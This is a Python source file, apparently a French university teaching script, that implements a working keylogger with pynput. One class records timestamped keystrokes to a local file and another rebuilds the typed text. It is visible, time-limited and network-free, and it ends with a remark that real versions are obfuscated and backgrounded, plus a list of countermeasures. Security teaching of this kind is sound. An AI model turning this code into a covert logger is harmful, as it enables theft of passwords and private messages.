"""
SA5 - Script 02 : Keylogger Pédagogique
EFREI Paris — Yousfi Souheib
-------------------------------------------------
Package requis : pynput
Installation   : pip install pynput --break-system-packages

⚠️  AVERTISSEMENT LÉGAL ET ÉTHIQUE ⚠️
Ce script est UNIQUEMENT à des fins pédagogiques.
N'utilisez jamais un keylogger sur un système sans
autorisation explicite du propriétaire.
Toute utilisation non autorisée est illégale.
-------------------------------------------------
"""

import sys
import subprocess
import os
import time
import threading
from datetime import datetime

# ─────────────────────────────────────────────────────────────
#  Installation automatique du package requis
# ─────────────────────────────────────────────────────────────

def installer_package(package):
    print(f"[INFO] Installation de '{package}' en cours...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", package,
                           "--break-system-packages", "-q"])
    print(f"[OK] '{package}' installé.\n")

try:
    from pynput import keyboard
except ImportError:
    installer_package("pynput")
    from pynput import keyboard

# ─────────────────────────────────────────────────────────────
#  Configuration
# ─────────────────────────────────────────────────────────────

LOG_FILE    = "keylog_pedagogique.txt"   # Fichier de log
DUREE_MAX   = 30                          # Durée max d'enregistrement (secondes)
TOUCHE_STOP = keyboard.Key.esc           # Touche pour arrêter

# ─────────────────────────────────────────────────────────────
#  Keylogger de base
# ─────────────────────────────────────────────────────────────

class KeyloggerSimple:
    """
    Keylogger basique : enregistre les touches dans un fichier.
    """
    
    def __init__(self, fichier_log=LOG_FILE, duree=DUREE_MAX):
        self.fichier_log = fichier_log
        self.duree = duree
        self.touches = []
        self.debut = None
        self.listener = None
        self._lock = threading.Lock()
    
    def _on_press(self, key):
        """Callback appelé à chaque pression de touche."""
        try:
            char = key.char
        except AttributeError:
            # Touche spéciale (Entrée, Backspace, etc.)
            char = f"[{key.name.upper()}]"
        
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        with self._lock:
            self.touches.append((timestamp, char))
        
        # Écriture en temps réel dans le fichier
        with open(self.fichier_log, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} | {char}\n")
        
        # Condition d'arrêt sur Echap
        if key == TOUCHE_STOP:
            print(f"\n[*] Touche ECHAP détectée — arrêt du keylogger.")
            return False
    
    def _on_release(self, key):
        """Callback appelé à chaque relâchement de touche."""
        pass  # Non utilisé dans cette démo
    
    def demarrer(self):
        """Lance l'écoute des touches pour la durée configurée."""
        self.debut = time.time()
        
        # Initialiser le fichier de log
        with open(self.fichier_log, "w", encoding="utf-8") as f:
            f.write(f"=== KEYLOGGER PÉDAGOGIQUE — SA5 EFREI ===\n")
            f.write(f"Démarré le : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*45}\n\n")
        
        print(f"[*] Keylogger démarré — durée max : {self.duree}s")
        print(f"[*] Tapez quelques touches puis appuyez sur ECHAP pour arrêter.")
        print(f"[*] Log sauvegardé dans : {self.fichier_log}\n")
        
        # Timer d'arrêt automatique
        timer = threading.Timer(self.duree, self.arreter)
        timer.start()
        
        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        ) as self.listener:
            self.listener.join()
        
        timer.cancel()
        self._rapport()
    
    def arreter(self):
        """Arrête le listener."""
        if self.listener:
            self.listener.stop()
    
    def _rapport(self):
        """Affiche un rapport des touches capturées."""
        elapsed = time.time() - self.debut
        print(f"\n{'='*50}")
        print(f"[RAPPORT] Keylogger arrêté après {elapsed:.1f}s")
        print(f"  Touches capturées : {len(self.touches)}")
        
        if self.touches:
            print(f"\n  Aperçu des {min(10, len(self.touches))} premières touches :")
            for ts, c in self.touches[:10]:
                print(f"    {ts} → {c}")
        
        print(f"\n  Log complet dans : {self.fichier_log}")
        print(f"{'='*50}")

# ─────────────────────────────────────────────────────────────
#  Keylogger avancé avec reconstruction de texte
# ─────────────────────────────────────────────────────────────

class KeyloggerTexte(KeyloggerSimple):
    """
    Version améliorée : reconstruit le texte tapé
    en gérant les Backspace et les Entrées.
    """
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.texte_reconstitue = []
        self.session_texte = ""
    
    def _on_press(self, key):
        try:
            char = key.char
            self.texte_reconstitue.append(char)
            self.session_texte += char
        except AttributeError:
            if key == keyboard.Key.backspace and self.texte_reconstitue:
                self.texte_reconstitue.pop()
                self.session_texte = self.session_texte[:-1]
            elif key == keyboard.Key.enter:
                self.texte_reconstitue.append("\n")
                self.session_texte += "\n"
            elif key == keyboard.Key.space:
                self.texte_reconstitue.append(" ")
                self.session_texte += " "
            elif key == TOUCHE_STOP:
                print(f"\n[*] Arrêt demandé.")
                return False
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        with open(self.fichier_log, "a", encoding="utf-8") as f:
            try:
                f.write(f"{timestamp} | {key.char}\n")
            except AttributeError:
                f.write(f"{timestamp} | [{key.name}]\n")
    
    def _rapport(self):
        super()._rapport()
        texte = "".join(self.texte_reconstitue)
        print(f"\n  Texte reconstitué : '{texte[:100]}'")

# ─────────────────────────────────────────────────────────────
#  Programme principal
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════╗")
    print("║      SA5 - Script 02 : Keylogger Pédagogique        ║")
    print("╠══════════════════════════════════════════════════════╣")
    print("║  ⚠️  USAGE PÉDAGOGIQUE UNIQUEMENT — EFREI PARIS     ║")
    print("╚══════════════════════════════════════════════════════╝\n")
    
    print("Choisissez le mode :")
    print("  1 - Keylogger simple (log horodaté)")
    print("  2 - Keylogger avec reconstruction de texte")
    print("  q - Quitter")
    
    choix = input("\nVotre choix : ").strip()
    
    if choix == "1":
        kl = KeyloggerSimple(duree=30)
        kl.demarrer()
    elif choix == "2":
        kl = KeyloggerTexte(fichier_log="keylog_texte.txt", duree=30)
        kl.demarrer()
    else:
        print("Sortie.")
    
    print(f"\n📋 Lisez le fichier de log pour voir les touches capturées.")
    print(f"🔒 En production, un tel script serait obfusqué et s'exécuterait en tâche de fond.")
    print(f"🛡️  Contre-mesures : outils anti-keylogger, clavier virtuel, 2FA matériel.")
